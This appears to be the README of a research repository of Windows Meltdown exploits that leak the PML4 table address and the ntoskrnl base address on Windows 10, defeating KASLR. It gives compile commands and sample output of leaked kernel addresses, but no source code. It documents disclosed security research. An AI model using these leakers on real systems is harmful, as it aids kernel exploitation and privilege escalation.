
# Windows Shadow leaking

This repository contains the Windows Meltdown exploits described in the [Meltdown Reloaded: Breaking Windows KASLR by Leaking KVA Shadow Mappings](https://labs.bluefrostsecurity.de/meltdown-reloaded-breaking-windows-kaslr), which can be used to leak the PML4 table address and the "ntoskrnl.exe" base address in the latest "Windows 10" versions (RS7 and 20H1).

## Sources compilation

Using the Visual Studio 64-bit command line compiler, just follow the steps bellow:

For compiling the PML4 leaker:
- Execute `cl.exe pml4leak-melt.c`

For compiling the NT leaker:
- Execute `cl.exe ntleak-melt.c`

## Output examples

PML4 table address leaker output example:

```
C:\Users\Public>pml4leak-melt.exe

[+] Leaking PML4...
 [+] Try 0/10
[+] Elapsed time: 16 ms
[+] PML4: fffff178bc5e2000 (entry 1e2)

C:\Users\Public>
```

NT base address leaker output example in targets with RAM memory equal or higher than 4GB:

```
C:\Users\Public>ntleak-melt.exe
[+] Win10 build number: 19041
[+] RAM detected: 4GB

[+] Leaking PML4...
 [+] Try 0/10
[+] Elapsed time: 15 ms
[+] PML4: fffff178bc5e2000 (entry 1e2)

[+] Leaking NT base address...
 [+] PML4 entry found: fffff178bc5e2f80 (entry 0x1f0)
  [+] PDPT entry found: fffff178bc5f0000 (entry 0x0)
   [+] PD entry found: fffff178be0003e8 (entry 0x7d)
   [+] PD entry found: fffff178be000518 (entry 0xa3)
    [+] PT entry found: fffff17c000a3108 (entry 0x21)

[+] NT base delta: 0xa21000
[+] NT POINTER: 0xfffff80014621000
[+] NT BASE: 0xfffff80013c00000

[+] Elapsed time: 141 ms
[+] NT base address: 0xfffff80013c00000 (entry 0xa3)

C:\Users\Public>
```
